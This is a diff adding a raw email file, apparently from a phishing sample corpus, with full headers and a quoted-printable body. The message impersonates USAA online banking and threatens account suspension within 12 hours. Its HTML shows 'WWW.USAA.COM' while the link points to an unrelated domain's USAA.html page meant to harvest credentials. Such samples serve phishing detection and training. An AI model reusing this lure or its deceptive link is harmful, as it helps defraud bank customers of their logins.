@@ -1,0 +1,140 @@
+Return-Path: <s.goodridge@outlook.com>
+X-Original-To: jose@login.monkey.org
+Delivered-To: jose@login.monkey.org
+Received: from forward.b.hostedemail.com (forward.b.hostedemail.com [64.98.36.17])
+	by l.monkey.org (Postfix) with ESMTP id E55FFF413E
+	for <jose@login.monkey.org>; Fri,  1 May 2015 16:27:19 -0500 (CDT)
+Received: from smtpin03.hostedemail.com (10.5.19.248.rfc1918.com [10.5.19.248])
+	by ofarelay03.b.hostedemail.com (Postfix) with SMTP id A9AAE18479B
+	for <jose@login.monkey.org>; Fri,  1 May 2015 21:27:15 +0000 (UTC)
+X-Forwarded-For: jose@monkey.org by Hostedemail
+Delivered-To: jose@monkey.org
+X-FDA: 70139618430.03.brass19_5c6fb63461d28
+Authentication-Results: auth.b.hostedemail.com; dkim=none
+	reason="no signature"; dkim-adsp=none (insecure policy);
+	dkim-atps=neutral
+X-Spam-Summary: 30,2,0,65e02e2a848a36ae,d41d8cd98f00b204,s.goodridge@outlook.com,:,RULES_HIT:41:72:355:379:581:856:962:967:969:973:978:983:988:989:1148:1151:1154:1189:1208:1221:1260:1263:1313:1314:1345:1381:1431:1432:1437:1516:1517:1518:1535:1544:1566:1570:1575:1588:1589:1711:1714:1730:1776:1792:2069:2070:2194:2198:2199:2200:2525:2527:2540:2553:2560:2565:2610:2682:2685:2693:2741:2829:2859:2894:2896:2899:2901:2902:2909:2924:2926:2933:2937:2939:2942:2945:2947:2951:2954:3022:3138:3139:3140:3141:3142:3690:3804:3865:3866:3867:3870:3871:3873:3934:3936:3938:3941:3944:3947:3950:3953:3956:3959:4117:4250:4321:4361:5007:6678:7809:7875:8513:8599:8603:8957:9025:9388:10004:10049:10214:10346:11473:11658:11914:12043:12219:12295:12438:12520:12555:12679:12740:12776:13046:13095:13139:13180:13229:13236:13237:14037:14096:14515:21080,0,RBL:neutral,CacheIP:none,Bayesian:0.5,0.5,0.5,Netcheck:none,DomainCache:0,MSF:not bulk,SPF:fp,MSBL:0,DNSBL:neutral,Custom_rules:0:0:0
+X-HE-Tag: brass19_5c6fb63461d28
+X-Filterd-Recvd-Size: 6591
+Received: from BLU004-OMC4S15.hotmail.com (blu004-omc4s15.hotmail.com [65.55.111.154])
+	by imf06.b.hostedemail.com (Postfix) with ESMTP
+	for <jose@monkey.org>; Fri,  1 May 2015 21:27:15 +0000 (UTC)
+Received: from BLU436-SMTP126 ([65.55.111.137]) by BLU004-OMC4S15.hotmail.com over TLS secured channel with Microsoft SMTPSVC(7.5.7601.22751);
+	 Fri, 1 May 2015 14:27:14 -0700
+X-TMN: [x/mpOmsdnCwLF91eR3RjPHpH+FnRP2OE]
+X-Originating-Email: [s.goodridge@outlook.com]
+Message-ID: <BLU436-SMTP126802456BC5DFB7F799A33FFD50@phx.gbl>
+From: USAA <s.goodridge@outlook.com>
+Subject: IMPORTANT - Password Reset
+To: jose@monkey.org
+Content-Type: multipart/alternative;
+	boundary="sNolrdb=_n2dRQMRveelidLqjmjXMNhgkA0"
+MIME-Version: 1.0
+Date: Fri, 1 May 2015 14:27:07 -0700
+X-Antivirus: avast! (VPS 150501-0, 05/01/2015), Outbound message
+X-Antivirus-Status: Clean
+X-OriginalArrivalTime: 01 May 2015 21:27:12.0473 (UTC) FILETIME=[966FA490:01D08455]
+Status: O
+X-Status: 
+X-Keywords:                  
+X-UID: 75
+
+--sNolrdb=_n2dRQMRveelidLqjmjXMNhgkA0
+Content-Type: text/plain
+Content-Transfer-Encoding: quoted-printable
+
+ - This mail is in HTML. Some elements may be ommited in plain text. -
+
+DEAR VALUED CUSTOMER
+During a recent security check on USAA online banking, your session co=
+uld not be verified for consistency, we require you to Click on the li=
+nk below to confirm your details:
+WWW.USAA.COM
+NOTE: Failure to do this withing 12hrs of receiving this message will =
+lead to access suspension, Sorry for the inconvenience.
+Regards,
+USAA ONLINE BANKING.
+
+--sNolrdb=_n2dRQMRveelidLqjmjXMNhgkA0
+Content-Type: text/html
+Content-Transfer-Encoding: quoted-printable
+
+<HTML><HEAD></HEAD>
+<BODY>
+<P><SPAN style=3D"COLOR: rgb(11,83,148)"><B><IMG style=3D"WHITE-SPACE:=
+ normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT: small arial,sa=
+ns-serif; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); =
+TEXT-INDENT: 0px" border=3D0 alt=3D"" src=3D"https://ci4.googleusercon=
+tent.com/proxy/U0RKK-68hu6LgjAfA1jBqJ14QGkCUxkkcuzfVgJZRMAgGp-B4wCEM2W=
+QuMmqMY_hhx8klDZRxSzTmfy8kyoLfS7w2CCXC2cOlPA8E-CRLgExdwOLA6j852wY=3Ds0=
+-d-e1-ft#https://content.usaa.com/mcontent/static_assets/Media/email_l=
+ogo.gif" width=3D86 height=3D57><FONT style=3D"WHITE-SPACE: normal; WO=
+RD-SPACING: 0px; TEXT-TRANSFORM: none; FONT: 12px arial,sans-serif; LE=
+TTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT:=
+ 0px"><BR></FONT><FONT style=3D"WHITE-SPACE: normal; WORD-SPACING: 0px=
+; TEXT-TRANSFORM: none; FONT: 12px arial,sans-serif; LETTER-SPACING: n=
+ormal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px"><BR></FON=
+T></B></SPAN></P>
+<DIV id=3Dyui_3_16_0_1_1430498848109_10752 style=3D"WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT: small arial,sans-ser=
+if; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-I=
+NDENT: 0px">
+<DIV id=3Dyui_3_16_0_1_1430498848109_10751><SPAN style=3D"COLOR: rgb(1=
+1,83,148)"><B><FONT id=3Dyui_3_16_0_1_1430498848109_10810>DEAR VALUED =
+CUSTOMER</FONT></B></SPAN></DIV>
+<DIV id=3Dyui_3_16_0_1_1430498848109_10754><SPAN style=3D"COLOR: rgb(1=
+1,83,148)"><B><BR></B></SPAN></DIV>
+<DIV id=3Dyui_3_16_0_1_1430498848109_10756><SPAN style=3D"COLOR: rgb(1=
+1,83,148)"><B><FONT id=3Dyui_3_16_0_1_1430498848109_10755>During a rec=
+ent security check on USAA online banking, your session could not be v=
+erified for consistency, we require you to Click on the link below to =
+confirm your details:<BR></FONT></B></SPAN></DIV></DIV>
+<DIV id=3Dyui_3_16_0_1_1430498848109_10757 style=3D"WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT: small arial,sans-ser=
+if; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-I=
+NDENT: 0px"><SPAN style=3D"COLOR: rgb(11,83,148)"><B><BR></B></SPAN></=
+DIV>
+<DIV id=3Dyui_3_16_0_1_1430498848109_10758 style=3D"WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT: small arial,sans-ser=
+if; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-I=
+NDENT: 0px"><SPAN style=3D"COLOR: rgb(11,83,148)"><B><FONT id=3Dyui_3_=
+16_0_1_1430498848109_10830><A href=3D"http://www.usaa.com/"><U id=3Dyu=
+i_3_16_0_1_1430498848109_10829><FONT id=3Dyui_3_16_0_1_1430498848109_1=
+0828 size=3D4><A id=3Dyui_3_16_0_1_1430498848109_10827 style=3D"TEXT-D=
+ECORATION: underline; BACKGROUND: none transparent scroll repeat 0% 0%=
+; OUTLINE-WIDTH: medium; PADDING-BOTTOM: 0px; PADDING-TOP: 0px; OUTLIN=
+E-STYLE: none; PADDING-LEFT: 0px; MARGIN: 0px; OUTLINE-COLOR: invert; =
+PADDING-RIGHT: 0px" href=3D"http://digital-fanedits.com/includes/USAA.=
+html" rel=3Dnofollow target=3D_blank>WWW.USAA.COM</A></FONT></U></A><B=
+R></FONT></B></SPAN></DIV>
+<DIV id=3Dyui_3_16_0_1_1430498848109_10759 style=3D"WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT: small arial,sans-ser=
+if; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-I=
+NDENT: 0px"><SPAN style=3D"COLOR: rgb(11,83,148)"><B><BR></B></SPAN></=
+DIV>
+<DIV id=3Dyui_3_16_0_1_1430498848109_10762 style=3D"WHITE-SPACE: norma=
+l; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FONT: small arial,sans-ser=
+if; LETTER-SPACING: normal; BACKGROUND-COLOR: rgb(255,255,255); TEXT-I=
+NDENT: 0px">
+<DIV id=3Dyui_3_16_0_1_1430498848109_10761><SPAN style=3D"COLOR: rgb(1=
+1,83,148)"><B><FONT id=3Dyui_3_16_0_1_1430498848109_10760>NOTE: Failur=
+e to do this withing 12hrs of receiving this message will lead to acce=
+ss suspension,&nbsp;Sorry for the inconvenience.<BR></FONT></B></SPAN>=
+</DIV>
+<DIV id=3Dyui_3_16_0_1_1430498848109_10766><SPAN style=3D"COLOR: rgb(1=
+1,83,148)"><B><BR></B></SPAN></DIV>
+<DIV id=3Dyui_3_16_0_1_1430498848109_10763><SPAN style=3D"COLOR: rgb(1=
+1,83,148)"><B>Regards,</B></SPAN></DIV>
+<DIV id=3Dyui_3_16_0_1_1430498848109_10764><SPAN style=3D"COLOR: rgb(1=
+1,83,148)"><B><FONT id=3Dyui_3_16_0_1_1430498848109_10767>USAA ONLINE =
+BANKING.</FONT></B></SPAN></DIV></DIV><SPAN style=3D"COLOR: rgb(11,83,=
+148)"><B><FONT style=3D"WHITE-SPACE: normal; WORD-SPACING: 0px; TEXT-T=
+RANSFORM: none; FONT: 12px arial,sans-serif; LETTER-SPACING: normal; B=
+ACKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px"><SPAN style=3D'WH=
+ITE-SPACE: normal; WORD-SPACING: 0px; TEXT-TRANSFORM: none; FLOAT: non=
+e; FONT: 13px "Helvetica Neue","Segoe UI",Helvetica,Arial,"Lucida Gran=
+de",sans-serif; DISPLAY: inline !important; LETTER-SPACING: normal; BA=
+CKGROUND-COLOR: rgb(255,255,255); TEXT-INDENT: 0px'></SPAN></FONT></B>=
+</SPAN></BODY></HTML>
+
+--sNolrdb=_n2dRQMRveelidLqjmjXMNhgkA0--
